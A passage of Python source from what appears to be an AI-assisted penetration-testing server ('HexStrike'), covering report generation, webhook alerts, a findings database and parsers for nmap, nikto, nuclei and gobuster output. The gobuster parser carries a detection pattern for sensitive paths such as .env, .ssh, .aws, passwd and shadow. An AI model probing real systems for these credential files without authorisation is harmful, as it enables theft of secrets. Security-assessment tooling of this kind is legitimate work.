    tool: str
    description: str
    evidence: str
    remediation: str
    timestamp: str
    tags: List[str]
    cve_ids: List[str]

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "Finding":
        sev = data.get("severity", "info").lower()
        cvss_defaults = {"critical": 9.0, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 0.0}
        return cls(
            id=data.get("id", str(uuid.uuid4())),
            title=data.get("title", "Unnamed Finding"),
            severity=sev,
            cvss_score=float(data.get("cvss_score", cvss_defaults.get(sev, 0.0))),
            target=data.get("target", ""),
            tool=data.get("tool", "manual"),
            description=data.get("description", ""),
            evidence=data.get("evidence", ""),
            remediation=data.get("remediation", ""),
            timestamp=data.get("timestamp", datetime.now().isoformat()),
            tags=data.get("tags", []),
            cve_ids=data.get("cve_ids", [])
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id, "title": self.title, "severity": self.severity,
            "cvss_score": self.cvss_score, "target": self.target, "tool": self.tool,
            "description": self.description, "evidence": self.evidence,
            "remediation": self.remediation, "timestamp": self.timestamp,
            "tags": self.tags, "cve_ids": self.cve_ids
        }


_REPORT_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ engagement_name }} — HexStrike Report</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>
<style>
  :root {
    --bg: #0d0d0d; --surface: #1a1a1a; --border: #2a2a2a;
    --red: #e53935; --orange: #ff6f00; --yellow: #fdd835;
    --green: #43a047; --blue: #1e88e5; --gray: #757575;
    --text: #e0e0e0; --text-dim: #9e9e9e;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; padding: 24px; }
  h1 { color: var(--red); font-size: 2rem; margin-bottom: 4px; }
  h2 { color: var(--text); font-size: 1.2rem; margin: 24px 0 12px; border-left: 3px solid var(--red); padding-left: 10px; }
  .meta { color: var(--text-dim); font-size: 0.85rem; margin-bottom: 24px; }
  .stats { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px; }
  .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px 24px; min-width: 120px; text-align: center; }
  .stat-card .num { font-size: 2rem; font-weight: bold; }
  .stat-card .label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; }
  .critical .num { color: var(--red); }
  .high .num { color: var(--orange); }
  .medium .num { color: var(--yellow); }
  .low .num { color: var(--green); }
  .info-s .num { color: var(--blue); }
  .chart-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px; max-width: 420px; margin-bottom: 28px; }
  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 14px; overflow: hidden; }
  .finding-header { display: flex; align-items: center; gap: 10px; padding: 12px 16px; cursor: pointer; }
  .finding-header:hover { background: #222; }
  .badge { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 0.72rem; font-weight: bold; text-transform: uppercase; }
  .badge-critical { background: var(--red); color: #fff; }
  .badge-high { background: var(--orange); color: #fff; }
  .badge-medium { background: var(--yellow); color: #000; }
  .badge-low { background: var(--green); color: #fff; }
  .badge-info { background: var(--blue); color: #fff; }
  .finding-title { font-weight: bold; flex: 1; }
  .finding-target { color: var(--text-dim); font-size: 0.82rem; }
  .finding-body { display: none; padding: 14px 16px; border-top: 1px solid var(--border); font-size: 0.88rem; line-height: 1.6; }
  .finding-body.open { display: block; }
  .field-label { color: var(--text-dim); font-size: 0.75rem; text-transform: uppercase; margin-top: 10px; margin-bottom: 4px; }
  pre { background: #111; border-radius: 4px; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 0.8rem; color: #4caf50; }
  .tag { display: inline-block; background: #2a2a2a; border-radius: 3px; padding: 1px 6px; font-size: 0.72rem; margin-right: 4px; color: var(--text-dim); }
  footer { margin-top: 40px; color: var(--text-dim); font-size: 0.78rem; text-align: center; }
</style>
</head>
<body>
<h1>⚡ {{ engagement_name }}</h1>
<div class="meta">Generated by HexStrike AI v7.0 &nbsp;|&nbsp; {{ generated_at }} &nbsp;|&nbsp; {{ total }} findings</div>

<h2>Executive Summary</h2>
<div class="stats">
  <div class="stat-card critical"><div class="num">{{ counts.critical }}</div><div class="label">Critical</div></div>
  <div class="stat-card high"><div class="num">{{ counts.high }}</div><div class="label">High</div></div>
  <div class="stat-card medium"><div class="num">{{ counts.medium }}</div><div class="label">Medium</div></div>
  <div class="stat-card low"><div class="num">{{ counts.low }}</div><div class="label">Low</div></div>
  <div class="stat-card info-s"><div class="num">{{ counts.info }}</div><div class="label">Info</div></div>
</div>

<div class="chart-wrap">
  <canvas id="sevChart" width="380" height="200"></canvas>
</div>

{% for sev in ['critical','high','medium','low','info'] %}
{% if findings_by_sev[sev] %}
<h2>{{ sev|upper }} ({{ findings_by_sev[sev]|length }})</h2>
{% for f in findings_by_sev[sev] %}
<div class="finding">
  <div class="finding-header" onclick="toggle('{{ f.id }}')">
    <span class="badge badge-{{ f.severity }}">{{ f.severity }}</span>
    <span class="finding-title">{{ f.title }}</span>
    <span class="finding-target">{{ f.target }}</span>
    <span style="color:var(--text-dim);font-size:0.78rem">CVSS {{ "%.1f"|format(f.cvss_score) }}</span>
  </div>
  <div class="finding-body" id="{{ f.id }}">
    <div class="field-label">Target</div><div>{{ f.target }}</div>
    <div class="field-label">Tool</div><div>{{ f.tool }}</div>
    {% if f.cve_ids %}<div class="field-label">CVEs</div><div>{{ f.cve_ids|join(', ') }}</div>{% endif %}
    <div class="field-label">Description</div><div>{{ f.description }}</div>
    {% if f.evidence %}<div class="field-label">Evidence</div><pre>{{ f.evidence }}</pre>{% endif %}
    {% if f.remediation %}<div class="field-label">Remediation</div><div>{{ f.remediation }}</div>{% endif %}
    {% if f.tags %}<div class="field-label">Tags</div><div>{% for t in f.tags %}<span class="tag">{{ t }}</span>{% endfor %}</div>{% endif %}
    <div class="field-label">Timestamp</div><div>{{ f.timestamp }}</div>
  </div>
</div>
{% endfor %}
{% endif %}
{% endfor %}

<footer>HexStrike AI v7.0 — Authorized Penetration Testing Only</footer>
<script>
function toggle(id){var el=document.getElementById(id);el.classList.toggle('open');}
const ctx=document.getElementById('sevChart').getContext('2d');
new Chart(ctx,{type:'doughnut',data:{labels:['Critical','High','Medium','Low','Info'],
datasets:[{data:[{{ counts.critical }},{{ counts.high }},{{ counts.medium }},{{ counts.low }},{{ counts.info }}],
backgroundColor:['#e53935','#ff6f00','#fdd835','#43a047','#1e88e5'],borderWidth:2,borderColor:'#1a1a1a'}]},
options:{plugins:{legend:{labels:{color:'#e0e0e0',font:{family:'Courier New'}}}},cutout:'65%'}});
</script>
</body>
</html>"""


# ============================================================================
# WEBHOOK NOTIFICATION ENGINE (v7.0)
# ============================================================================

class WebhookNotifier:
    """
    Sends real-time alerts to Slack, Discord, or generic webhooks when
    findings are added above a configured severity threshold.

    Supports:
      - Slack  (incoming webhooks — formatted attachment with color coding)
      - Discord (webhook embeds with severity colors)
      - Generic HTTP POST (raw JSON payload)

    Config persisted to ~/.hexstrike/webhooks.json
    """

    CONFIG_PATH = Path.home() / ".hexstrike" / "webhooks.json"

    _SEV_COLORS = {
        "critical": {"slack": "#e53935", "discord": 0xe53935},
        "high":     {"slack": "#ff6f00", "discord": 0xff6f00},
        "medium":   {"slack": "#fdd835", "discord": 0xfdd835},
        "low":      {"slack": "#43a047", "discord": 0x43a047},
        "info":     {"slack": "#1e88e5", "discord": 0x1e88e5},
    }
    _SEV_EMOJI = {
        "critical": "🚨", "high": "🔴", "medium": "🟡", "low": "🟢", "info": "🔵"
    }

    def __init__(self):
        self._lock = threading.Lock()
        self.webhooks: List[Dict[str, Any]] = []   # list of webhook configs
        self._load()

    # ── Persistence ─────────────────────────────────────────────────────────

    def _load(self):
        try:
            if self.CONFIG_PATH.exists():
                self.webhooks = json.loads(self.CONFIG_PATH.read_text())
                logger.info(f"🔔 Webhooks loaded: {len(self.webhooks)} configured")
        except Exception as exc:
            logger.warning(f"Could not load webhooks config: {exc}")
            self.webhooks = []

    def _save(self):
        try:
            self.CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True)
            self.CONFIG_PATH.write_text(json.dumps(self.webhooks, indent=2))
        except Exception as exc:
            logger.warning(f"Could not save webhooks config: {exc}")

    # ── Configuration ────────────────────────────────────────────────────────

    def add_webhook(self, url: str, platform: str = "generic",
                    min_severity: str = "high", name: str = "") -> Dict[str, Any]:
        """
        Register a webhook.

        platform: slack | discord | generic
        min_severity: minimum severity to trigger (critical | high | medium | low | info)
        """
        with self._lock:
            platform = platform.lower()
            min_severity = min_severity.lower()
            if platform not in ("slack", "discord", "generic"):
                return {"success": False, "error": "platform must be: slack | discord | generic"}
            if min_severity not in self._SEV_COLORS:
                return {"success": False, "error": "min_severity must be: critical | high | medium | low | info"}

            entry = {
                "id":           str(uuid.uuid4())[:8],
                "name":         name or f"{platform}-webhook",
                "url":          url,
                "platform":     platform,
                "min_severity": min_severity,
                "enabled":      True,
                "created":      datetime.now().isoformat()
            }
            self.webhooks.append(entry)
            self._save()
            logger.info(f"🔔 Webhook registered: {entry['name']} [{platform}] min={min_severity}")
            return {"success": True, "webhook": entry}

    def remove_webhook(self, webhook_id: str) -> Dict[str, Any]:
        with self._lock:
            before = len(self.webhooks)
            self.webhooks = [w for w in self.webhooks if w["id"] != webhook_id]
            self._save()
            removed = before - len(self.webhooks)
            return {"success": removed > 0, "removed": removed}

    def list_webhooks(self) -> List[Dict[str, Any]]:
        with self._lock:
            # Return without exposing full URL (mask it for security)
            safe = []
            for w in self.webhooks:
                entry = dict(w)
                url = entry.get("url", "")
                entry["url_masked"] = url[:30] + "…" + url[-10:] if len(url) > 40 else url
                del entry["url"]
                safe.append(entry)
            return safe

    def clear_webhooks(self):
        with self._lock:
            self.webhooks = []
            self._save()

    # ── Severity ordering ─────────────────────────────────────────────────────

    _SEV_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

    def _should_notify(self, finding_severity: str, min_severity: str) -> bool:
        fs = self._SEV_ORDER.get(finding_severity.lower(), 0)
        ms = self._SEV_ORDER.get(min_severity.lower(), 3)
        return fs >= ms

    # ── Payload builders ──────────────────────────────────────────────────────

    def _build_slack_payload(self, finding: "Finding", engagement: str) -> Dict:
        sev = finding.severity.lower()
        color = self._SEV_COLORS.get(sev, {}).get("slack", "#9e9e9e")
        emoji = self._SEV_EMOJI.get(sev, "🔵")
        return {
            "username": "HexStrike AI",
            "icon_emoji": ":shield:",
            "attachments": [{
                "color": color,
                "title": f"{emoji} [{sev.upper()}] {finding.title}",
                "text": finding.description[:300] if finding.description else "",
                "fields": [
                    {"title": "Target",     "value": finding.target or "—",      "short": True},
                    {"title": "Tool",       "value": finding.tool or "—",        "short": True},
                    {"title": "Engagement", "value": engagement,                  "short": True},
                    {"title": "CVSS",       "value": str(finding.cvss_score),    "short": True},
                    {"title": "Evidence",   "value": (finding.evidence or "")[:200], "short": False},
                ],
                "footer": "HexStrike AI v7.0",
                "ts": int(datetime.now().timestamp())
            }]
        }

    def _build_discord_payload(self, finding: "Finding", engagement: str) -> Dict:
        sev = finding.severity.lower()
        color = self._SEV_COLORS.get(sev, {}).get("discord", 0x9e9e9e)
        emoji = self._SEV_EMOJI.get(sev, "🔵")
        return {
            "embeds": [{
                "title":       f"{emoji} [{sev.upper()}] {finding.title}",
                "description": finding.description[:2000] if finding.description else "",
                "color":       color,
                "fields": [
                    {"name": "Target",     "value": finding.target or "—",   "inline": True},
                    {"name": "Tool",       "value": finding.tool or "—",     "inline": True},
                    {"name": "CVSS",       "value": str(finding.cvss_score), "inline": True},
                    {"name": "Engagement", "value": engagement,               "inline": True},
                    {"name": "Evidence",   "value": (finding.evidence or "—")[:1000], "inline": False},
                ],
                "footer": {"text": "HexStrike AI v7.0"},
                "timestamp": datetime.now().isoformat()
            }]
        }

    def _build_generic_payload(self, finding: "Finding", engagement: str) -> Dict:
        return {
            "event":      "finding_added",
            "engagement": engagement,
            "finding": {
                "id":          finding.id,
                "title":       finding.title,
                "severity":    finding.severity,
                "cvss_score":  finding.cvss_score,
                "target":      finding.target,
                "tool":        finding.tool,
                "description": finding.description,
                "evidence":    finding.evidence,
                "remediation": finding.remediation,
                "tags":        finding.tags,
                "cve_ids":     finding.cve_ids,
                "timestamp":   finding.timestamp,
            },
            "generated_at": datetime.now().isoformat(),
            "source": "hexstrike-ai-v7.0"
        }

    # ── Dispatch ──────────────────────────────────────────────────────────────

    def notify(self, finding: "Finding", engagement: str):
        """Send notifications to all eligible webhooks (non-blocking, best-effort)."""
        with self._lock:
            active = [w for w in self.webhooks if w.get("enabled", True)]

        if not active:
            return

        def _send():
            for wh in active:
                if not self._should_notify(finding.severity, wh.get("min_severity", "high")):
                    continue
                try:
                    platform = wh.get("platform", "generic")
                    if platform == "slack":
                        payload = self._build_slack_payload(finding, engagement)
                    elif platform == "discord":
                        payload = self._build_discord_payload(finding, engagement)
                    else:
                        payload = self._build_generic_payload(finding, engagement)

                    resp = requests.post(
                        wh["url"], json=payload,
                        timeout=10,
                        headers={"Content-Type": "application/json"}
                    )
                    if resp.status_code in (200, 204):
                        logger.info(f"🔔 Webhook notified: {wh['name']} [{resp.status_code}]")
                    else:
                        logger.warning(f"⚠️  Webhook {wh['name']} returned {resp.status_code}")
                except Exception as exc:
                    logger.warning(f"Webhook {wh.get('name','?')} failed: {exc}")

        # Fire in a daemon thread — never block the main flow
        threading.Thread(target=_send, daemon=True).start()

    def test_webhook(self, webhook_id: str, engagement: str = "Test Engagement") -> Dict[str, Any]:
        """Send a synthetic critical finding to verify the webhook works."""
        with self._lock:
            wh = next((w for w in self.webhooks if w["id"] == webhook_id), None)
        if not wh:
            return {"success": False, "error": f"Webhook '{webhook_id}' not found"}

        # Build a synthetic test finding
        test_finding = Finding(
            id=str(uuid.uuid4()),
            title="[TEST] HexStrike Webhook — Connection Verified",
            severity="critical",
            cvss_score=10.0,
            target="test-target.example.com",
            tool="hexstrike-webhook-test",
            description="This is a test notification from HexStrike AI v7.0. Your webhook is working correctly.",
            evidence="Webhook test triggered manually via /api/webhooks/test",
            remediation="No action required — this is a test.",
            timestamp=datetime.now().isoformat(),
            tags=["test"],
            cve_ids=[]
        )
        try:
            platform = wh.get("platform", "generic")
            if platform == "slack":
                payload = self._build_slack_payload(test_finding, engagement)
            elif platform == "discord":
                payload = self._build_discord_payload(test_finding, engagement)
            else:
                payload = self._build_generic_payload(test_finding, engagement)

            resp = requests.post(wh["url"], json=payload, timeout=10,
                                 headers={"Content-Type": "application/json"})
            ok = resp.status_code in (200, 204)
            return {
                "success": ok,
                "webhook": wh["name"],
                "status_code": resp.status_code,
                "response": resp.text[:200] if not ok else "OK"
            }
        except Exception as exc:
            return {"success": False, "error": str(exc)}


# Singleton
webhook_notifier = WebhookNotifier()


# ── Webhook management endpoints ─────────────────────────────────────────────

@app.route("/api/webhooks/add", methods=["POST"])
@require_api_key
def webhooks_add():
    """Register a new webhook (Slack / Discord / generic HTTP POST)."""
    try:
        params = request.json or {}
        url          = sanitize_input(params.get("url", ""))
        platform     = sanitize_input(params.get("platform", "generic"))
        min_severity = sanitize_input(params.get("min_severity", "high"))
        name         = sanitize_input(params.get("name", ""))
        if not url:
            return jsonify({"error": "url is required"}), 400
        result = webhook_notifier.add_webhook(url, platform, min_severity, name)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/webhooks/list", methods=["GET"])
@require_api_key
def webhooks_list():
    return jsonify({"success": True, "webhooks": webhook_notifier.list_webhooks()})


@app.route("/api/webhooks/remove", methods=["POST"])
@require_api_key
def webhooks_remove():
    try:
        params = request.json or {}
        webhook_id = sanitize_input(params.get("id", ""))
        if not webhook_id:
            return jsonify({"error": "id is required"}), 400
        return jsonify(webhook_notifier.remove_webhook(webhook_id))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/webhooks/test", methods=["POST"])
@require_api_key
def webhooks_test():
    """Send a synthetic test finding to verify a webhook is reachable."""
    try:
        params = request.json or {}
        webhook_id = sanitize_input(params.get("id", ""))
        if not webhook_id:
            return jsonify({"error": "id is required"}), 400
        result = webhook_notifier.test_webhook(webhook_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/webhooks/clear", methods=["POST"])
@require_api_key
def webhooks_clear():
    webhook_notifier.clear_webhooks()
    return jsonify({"success": True, "message": "All webhooks removed"})


class HexStrikeReportEngine:
    """
    Generates HTML and PDF penetration testing reports from collected findings.
    Findings are persisted to SQLite — survives server restarts.
    Supports multiple named engagements.
    DB location: ~/.hexstrike/findings.db
    """

    DB_PATH = Path.home() / ".hexstrike" / "findings.db"

    def __init__(self):
        self.findings: List[Finding] = []
        self.engagement_name: str = "Default Engagement"
        self._lock = threading.RLock()
        self._init_db()
        self._load_from_db()

    # ------------------------------------------------------------------
    # SQLite persistence
    # ------------------------------------------------------------------
    def _conn(self) -> sqlite3.Connection:
        """Return a thread-local SQLite connection."""
        conn = sqlite3.connect(str(self.DB_PATH))
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        """Create tables if they don't exist."""
        try:
            self.DB_PATH.parent.mkdir(parents=True, exist_ok=True)
            with self._conn() as conn:
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS engagements (
                        name TEXT PRIMARY KEY,
                        created_at TEXT NOT NULL,
                        updated_at TEXT NOT NULL
                    )
                """)
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS findings (
                        id          TEXT PRIMARY KEY,
                        engagement  TEXT NOT NULL,
                        title       TEXT,
                        severity    TEXT,
                        cvss_score  REAL,
                        target      TEXT,
                        tool        TEXT,
                        description TEXT,
                        evidence    TEXT,
                        remediation TEXT,
                        timestamp   TEXT,
                        tags        TEXT,
                        cve_ids     TEXT,
                        FOREIGN KEY (engagement) REFERENCES engagements(name)
                    )
                """)
                conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_engagement ON findings(engagement)")
                conn.commit()
            logger.info(f"💾 Report DB initialized: {self.DB_PATH}")
        except Exception as e:
            logger.warning(f"⚠️  Could not initialize findings DB: {e}")

    def _ensure_engagement(self, name: str):
        """Insert engagement row if it doesn't exist."""
        now = datetime.now().isoformat()
        with self._conn() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO engagements(name, created_at, updated_at) VALUES (?,?,?)",
                (name, now, now)
            )
            conn.execute(
                "UPDATE engagements SET updated_at=? WHERE name=?",
                (now, name)
            )
            conn.commit()

    def _load_from_db(self):
        """Load findings for the current engagement from DB into memory."""
        try:
            with self._conn() as conn:
                rows = conn.execute(
                    "SELECT * FROM findings WHERE engagement=? ORDER BY timestamp ASC",
                    (self.engagement_name,)
                ).fetchall()
            self.findings = [self._row_to_finding(r) for r in rows]
            logger.info(f"📂 Loaded {len(self.findings)} findings for engagement '{self.engagement_name}'")
        except Exception as e:
            logger.warning(f"⚠️  Could not load findings from DB: {e}")
            self.findings = []

    def _row_to_finding(self, row: sqlite3.Row) -> Finding:
        return Finding(
            id=row["id"], title=row["title"], severity=row["severity"],
            cvss_score=row["cvss_score"] or 0.0, target=row["target"] or "",
            tool=row["tool"] or "", description=row["description"] or "",
            evidence=row["evidence"] or "", remediation=row["remediation"] or "",
            timestamp=row["timestamp"] or datetime.now().isoformat(),
            tags=json.loads(row["tags"] or "[]"),
            cve_ids=json.loads(row["cve_ids"] or "[]")
        )

    def _save_finding_to_db(self, finding: Finding):
        try:
            self._ensure_engagement(self.engagement_name)
            with self._conn() as conn:
                conn.execute("""
                    INSERT OR REPLACE INTO findings
                    (id, engagement, title, severity, cvss_score, target, tool,
                     description, evidence, remediation, timestamp, tags, cve_ids)
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
                """, (
                    finding.id, self.engagement_name, finding.title, finding.severity,
                    finding.cvss_score, finding.target, finding.tool, finding.description,
                    finding.evidence, finding.remediation, finding.timestamp,
                    json.dumps(finding.tags), json.dumps(finding.cve_ids)
                ))
                conn.commit()
        except Exception as e:
            logger.warning(f"⚠️  Could not persist finding to DB: {e}")

    def _clear_db(self, engagement: str = ""):
        """Delete findings for given engagement (or current if empty)."""
        name = engagement or self.engagement_name
        try:
            with self._conn() as conn:
                conn.execute("DELETE FROM findings WHERE engagement=?", (name,))
                conn.commit()
        except Exception as e:
            logger.warning(f"⚠️  Could not clear DB findings: {e}")

    # ------------------------------------------------------------------
    # Engagement management
    # ------------------------------------------------------------------
    def set_engagement(self, name: str):
        """Switch to a different engagement, loading its findings."""
        with self._lock:
            self.engagement_name = name
            self._load_from_db()
            logger.info(f"🎯 Active engagement: '{name}' ({len(self.findings)} findings)")

    def list_engagements(self) -> List[Dict[str, Any]]:
        """Return all engagements with finding counts."""
        try:
            with self._conn() as conn:
                rows = conn.execute("""
                    SELECT e.name, e.created_at, e.updated_at,
                           COUNT(f.id) as finding_count,
                           SUM(CASE WHEN f.severity='critical' THEN 1 ELSE 0 END) as critical,
                           SUM(CASE WHEN f.severity='high'     THEN 1 ELSE 0 END) as high,
                           SUM(CASE WHEN f.severity='medium'   THEN 1 ELSE 0 END) as medium
                    FROM engagements e
                    LEFT JOIN findings f ON f.engagement = e.name
                    GROUP BY e.name
                    ORDER BY e.updated_at DESC
                """).fetchall()
            return [dict(r) for r in rows]
        except Exception as e:
            return []

    def delete_engagement(self, name: str) -> bool:
        """Delete an engagement and all its findings."""
        try:
            self._clear_db(name)
            with self._conn() as conn:
                conn.execute("DELETE FROM engagements WHERE name=?", (name,))
                conn.commit()
            if self.engagement_name == name:
                self.engagement_name = "Default Engagement"
                self.findings = []
            return True
        except Exception as e:
            logger.warning(f"⚠️  Could not delete engagement: {e}")
            return False

    # ------------------------------------------------------------------
    # Finding management
    # ------------------------------------------------------------------
    def add_finding(self, finding: Finding):
        with self._lock:
            # Deduplicate by title + target
            existing_key = f"{finding.title}|{finding.target}"
            for existing in self.findings:
                if f"{existing.title}|{existing.target}" == existing_key:
                    logger.info(f"⚠️  Duplicate finding skipped: {finding.title} @ {finding.target}")
                    return
            self.findings.append(finding)
            self._save_finding_to_db(finding)
            logger.info(f"📋 Finding added [{finding.severity.upper()}]: {finding.title}")
        # Fire webhook notifications (non-blocking, outside the lock)
        webhook_notifier.notify(finding, self.engagement_name)

    def clear_findings(self):
        with self._lock:
            self.findings.clear()
            self._clear_db()
            logger.info("🧹 All findings cleared")

    def get_statistics(self) -> Dict[str, Any]:
        with self._lock:
            counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
            tools_used: Set[str] = set()
            targets_affected: Set[str] = set()
            for f in self.findings:
                counts[f.severity] = counts.get(f.severity, 0) + 1
                tools_used.add(f.tool)
                if f.target:
                    targets_affected.add(f.target)
            return {
                "total": len(self.findings),
                "by_severity": counts,
                "tools_used": sorted(tools_used),
                "targets_affected": sorted(targets_affected)
            }

    def _findings_by_severity(self) -> Dict[str, List[Finding]]:
        result: Dict[str, List[Finding]] = {s: [] for s in ["critical", "high", "medium", "low", "info"]}
        for f in sorted(self.findings, key=lambda x: ["critical","high","medium","low","info"].index(x.severity) if x.severity in ["critical","high","medium","low","info"] else 99):
            result.setdefault(f.severity, []).append(f)
        return result

    # ------------------------------------------------------------------
    # Auto-import from tool output
    # ------------------------------------------------------------------
    def auto_import_from_nuclei(self, raw_output: str) -> int:
        """Parse nuclei JSON lines output and add findings."""
        count = 0
        for line in raw_output.strip().splitlines():
            try:
                data = json.loads(line)
                sev = data.get("info", {}).get("severity", "info").lower()
                finding = Finding(
                    id=str(uuid.uuid4()),
                    title=data.get("info", {}).get("name", "Nuclei Finding"),
                    severity=sev,
                    cvss_score={"critical": 9.0, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 0.0}.get(sev, 0.0),
                    target=data.get("host", data.get("matched-at", "")),
                    tool="nuclei",
                    description=data.get("info", {}).get("description", ""),
                    evidence=data.get("matched-at", ""),
                    remediation=data.get("info", {}).get("remediation", ""),
                    timestamp=data.get("timestamp", datetime.now().isoformat()),
                    tags=data.get("info", {}).get("tags", []) if isinstance(data.get("info", {}).get("tags", []), list) else [],
                    cve_ids=[]
                )
                self.add_finding(finding)
                count += 1
            except (json.JSONDecodeError, KeyError):
                continue
        return count

    def auto_import_from_nmap(self, raw_output: str, target: str = "") -> int:
        """
        Parse nmap stdout and create findings for interesting/dangerous services.
        Flags: open Telnet, FTP anon, SMB, RDP, default creds services, known vuln scripts.
        """
        count = 0
        _RISKY_SERVICES = {
            "telnet":   ("Telnet Service Exposed", "high",   6.5,  "Telnet transmits credentials in cleartext. Disable and replace with SSH."),
            "ftp":      ("FTP Service Exposed",    "medium", 5.3,  "FTP transmits data unencrypted. Restrict access and prefer SFTP/FTPS."),
            "ms-wbt-server": ("RDP Exposed to Network", "high", 7.0, "RDP is a common target for brute-force and BlueKeep-class exploits. Restrict with firewall."),
            "microsoft-ds":  ("SMB Port Open",    "medium", 5.0,  "SMB can be abused for relay attacks and ransomware lateral movement."),
            "netbios-ssn":   ("NetBIOS Session Service Open", "low", 3.0, "Legacy protocol. Disable if not required."),
            "vnc":      ("VNC Service Exposed",   "high",   7.5,  "VNC is frequently misconfigured with weak or no authentication."),
            "rlogin":   ("rlogin Service Exposed","high",   7.5,  "Obsolete remote login service. Disable immediately."),
            "rsh":      ("rsh Service Exposed",   "high",   7.5,  "Obsolete remote shell service. Disable immediately."),
            "smtp":     ("SMTP Service Open",     "info",   0.0,  "Verify SMTP relay is not open to the Internet."),
            "snmp":     ("SNMP Service Open",     "medium", 5.3,  "Default SNMP community strings (public/private) may allow info disclosure."),
        }
        # Parse nmap service lines: 22/tcp  open  ssh  OpenSSH 8.9
        current_host = target
        for line in raw_output.splitlines():
            host_match = re.search(r'Nmap scan report for (.+)', line)
            if host_match:
                current_host = host_match.group(1).strip()
                continue

            svc_match = re.match(r'^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)?$', line.strip())
            if not svc_match:
                continue

            port    = svc_match.group(1)
            proto   = svc_match.group(2)
            service = svc_match.group(3).lower()
            version = (svc_match.group(4) or "").strip()

            if service in _RISKY_SERVICES:
                title, sev, cvss, remediation = _RISKY_SERVICES[service]
                finding = Finding(
                    id=str(uuid.uuid4()),
                    title=title,
                    severity=sev,
                    cvss_score=cvss,
                    target=f"{current_host}:{port}/{proto}",
                    tool="nmap",
                    description=f"Service '{service}' detected on port {port}/{proto}. Version: {version or 'unknown'}",
                    evidence=line.strip(),
                    remediation=remediation,
                    timestamp=datetime.now().isoformat(),
                    tags=["network", "service-exposure"],
                    cve_ids=[]
                )
                self.add_finding(finding)
                count += 1

            # NSE script output: look for vuln/exploit hits
            if "VULNERABLE" in line or "CVE-" in line:
                cves = re.findall(r'CVE-\d{4}-\d+', line)
                finding = Finding(
                    id=str(uuid.uuid4()),
                    title=f"Nmap NSE Vulnerability: {service} on {port}",
                    severity="high",
                    cvss_score=7.5,
                    target=f"{current_host}:{port}/{proto}",
                    tool="nmap-nse",
                    description=line.strip(),
                    evidence=line.strip(),
                    remediation="Apply vendor patch for identified CVE(s).",
                    timestamp=datetime.now().isoformat(),
                    tags=["vuln", "nse"],
                    cve_ids=cves
                )
                self.add_finding(finding)
                count += 1

        return count

    def auto_import_from_nikto(self, raw_output: str, target: str = "") -> int:
        """
        Parse nikto text/CSV output and create findings.
        Handles both standard text (+ prefix) and CSV formats.
        """
        count = 0
        _SEV_KEYWORDS = {
            "critical": ("critical", 9.0),
            "injection": ("high",    7.5),
            "xss":       ("high",    7.0),
            "csrf":      ("medium",  5.0),
            "disclosure": ("medium", 5.0),
            "traversal": ("high",    7.5),
            "default":   ("medium",  5.0),
            "password":  ("high",    7.0),
            "backup":    ("medium",  4.5),
            "config":    ("medium",  4.0),
            "phpinfo":   ("medium",  4.0),
            "debug":     ("medium",  4.0),
        }

        for line in raw_output.splitlines():
            # Standard nikto text: "+ OSVDB-3233: /icons/: ..."
            m = re.match(r'^\+\s+(?:OSVDB-\d+:\s+)?(.+)', line.strip())
            if not m:
                # CSV format: host,ip,port,osvdb,method,url,desc
                parts = line.split(',')
                if len(parts) >= 7:
                    desc = parts[6].strip()
                    url  = parts[5].strip()
                else:
                    continue
                text = desc
            else:
                text = m.group(1).strip()
                url  = ""
                url_m = re.search(r'(/\S+)', text)
                if url_m:
                    url = url_m.group(1)

            if len(text) < 10:
                continue

            # Determine severity from keywords
            lower = text.lower()
            sev, cvss = "info", 0.0
            for kw, (s, c) in _SEV_KEYWORDS.items():
                if kw in lower:
                    sev, cvss = s, c
                    break

            finding = Finding(
                id=str(uuid.uuid4()),
                title=f"Nikto: {text[:80]}",
                severity=sev,
                cvss_score=cvss,
                target=target or url,
                tool="nikto",
                description=text,
                evidence=line.strip(),
                remediation="Review and remediate the identified web server misconfiguration or vulnerability.",
                timestamp=datetime.now().isoformat(),
                tags=["web", "nikto"],
                cve_ids=re.findall(r'CVE-\d{4}-\d+', text)
            )
            self.add_finding(finding)
            count += 1

        return count

    def auto_import_from_gobuster(self, raw_output: str, target: str = "") -> int:
        """
        Parse gobuster/feroxbuster dir/file output and create findings for
        sensitive paths (admin, backup, config, credentials, etc.).
        """
        count = 0
        _SENSITIVE = re.compile(
            r'(admin|backup|\.git|\.env|config|passwd|shadow|credential|secret|'
            r'\.bak|\.sql|\.log|\.old|\.swp|phpinfo|debug|console|actuator|'
            r'\.aws|\.ssh|wp-config|web\.config|application\.properties)',
            re.IGNORECASE
        )

        for line in raw_output.splitlines():
            # gobuster: /admin (Status: 200) [Size: 4321]
            # feroxbuster: 200      GET   /admin
